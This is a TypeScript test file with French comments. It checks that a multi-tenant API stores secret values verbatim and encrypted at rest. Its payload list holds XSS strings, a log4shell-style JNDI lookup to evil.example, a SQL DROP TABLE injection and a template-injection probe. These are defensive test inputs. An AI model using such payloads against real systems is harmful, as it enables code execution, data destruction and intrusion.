// Test : payloads dangereux stockés dans la VALEUR d'un secret.
//
// Couvre proposal Injections & XSS #4 — XSS stocké dans les valeurs de secrets
// (le NOM est déjà couvert par injection-guards ; la clé est de toute façon
// contrainte ^[A-Z][A-Z0-9_]*$). La valeur est libre : on vérifie qu'elle est
// stockée chiffrée et renvoyée VERBATIM, sans exécution ni altération côté
// serveur (l'échappement au rendu est la responsabilité du front).

import { describe, it, expect, beforeAll, afterAll } from "vitest";
import {
  Session,
  adminSession,
  postJson,
  ADMIN_EMAIL,
  TENANT_SCHEMA,
} from "./helpers/api";
import { execSql } from "./helpers/db";
import { provisionOrg } from "./helpers/org";

const SUFFIX = `${Date.now()}`;
const ORG_SLUG = `xss-${SUFFIX}`;
const KEY = "XSS_VALUE_TEST";

// XSS, log4shell-like, SQL, SSTI, caractères de contrôle.
const PAYLOADS = [
  "<script>alert(1)</script>",
  "${jndi:ldap://evil.example/x}",
  '"; DROP TABLE users; --',
  "{{7*7}}",
  "<img src=x onerror=alert(1)>",
  "line1\nline2\twith\ttabs",
];

let admin: Session;
let orgId = "";
let adminUserId = "";

beforeAll(async () => {
  admin = await adminSession();
  adminUserId = (
    await execSql(`SELECT id FROM "${TENANT_SCHEMA}"."User" WHERE email = '${ADMIN_EMAIL}'`)
  ).trim();
  if (!adminUserId) throw new Error("Admin user not found");
  orgId = await provisionOrg(ORG_SLUG, adminUserId);
});

afterAll(async () => {
  await execSql(`DELETE FROM "${TENANT_SCHEMA}"."Organization" WHERE slug = '${ORG_SLUG}'`);
});

describe("Payloads stockés dans la valeur d'un secret (Injections & XSS #4)", () => {
  it.each(PAYLOADS)(
    "la valeur %j est renvoyée verbatim (aucune sanitization serveur)",
    async (payload) => {
      const post = await postJson(admin, `/api/orgs/${ORG_SLUG}/secrets`, {
        key: KEY,
        value: payload,
      });
      expect(post.status).toBe(200);

      const get = await admin.fetch(`/api/orgs/${ORG_SLUG}/secrets/${KEY}`);
      expect(get.status).toBe(200);
      const body = (await get.json()) as { value?: string };
      expect(body.value).toBe(payload); // round-trip exact
    },
  );

  it("la valeur n'apparaît PAS en clair en base (chiffrée at-rest)", async () => {
    await postJson(admin, `/api/orgs/${ORG_SLUG}/secrets`, {
      key: KEY,
      value: "<script>marker-PLAINTEXT-XSS</script>",
    });
    const enc = await execSql(
      `SELECT "encryptedValue" FROM "${TENANT_SCHEMA}"."OrgSecret"
       WHERE key = '${KEY}' AND "organizationId" = '${orgId}'`,
    );
    expect(enc).not.toContain("marker-PLAINTEXT-XSS");
    expect(enc).not.toContain("<script>");
  });
});
